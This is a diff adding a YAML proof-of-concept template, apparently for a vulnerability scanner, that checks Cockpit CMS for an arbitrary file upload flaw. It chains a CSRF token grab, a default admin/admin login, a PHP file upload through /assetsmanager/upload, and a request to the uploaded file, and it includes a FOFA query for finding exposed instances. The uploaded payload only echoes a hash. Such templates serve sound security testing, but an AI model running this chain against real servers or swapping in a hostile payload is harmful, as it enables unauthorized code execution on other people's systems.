@@ -1,0 +1,55 @@
+id: poc-yaml-cockpit-assetsmanager-anyfile-upload
+info:
+  name: cockpit assetsmanager 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: cockpit
+  fofa: title="Authenticate Please!"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  t3: datetime("2006")
+  t4: datetime("01")
+  t5: datetime("02")
+requests:
+- method: GET
+  path: /auth/login?to=/
+  expression: status_code == 200 && contains(body,"Authenticate Please")
+  output:
+  - regex_match(body,`csfr \x3a "(?P<csrf>.*?)"`)
+- method: POST
+  path: /auth/check
+  headers:
+    Content-Type: application/json
+  data: '{"auth":{"user":"admin","password":"admin"},"csfr":"{{.csrf}}"}'
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"mysession=(?P<cookie>.*);")
+- method: POST
+  path: /assetsmanager/upload
+  headers:
+    Cookie: mysession={{.cookie}}
+    Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
+  data: '-----------------------------36D28FBc36bd6feE7Fb3
+
+    Content-Disposition: form-data; name="files[]"; filename="{{.t1}}.php"
+
+    Content-Type: text/php
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------36D28FBc36bd6feE7Fb3
+
+    Content-Disposition: form-data; name="folder"
+
+
+    -----------------------------36D28FBc36bd6feE7Fb3--'
+  expression: status_code == 200 && contains(body,t1)
+  output:
+  - regex_match(body,`/(?P<file>[0-9a-z_]{8,32}).php`)
+- method: GET
+  path: /storage/uploads/{{.t3}}/{{.t4}}/{{.t5}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
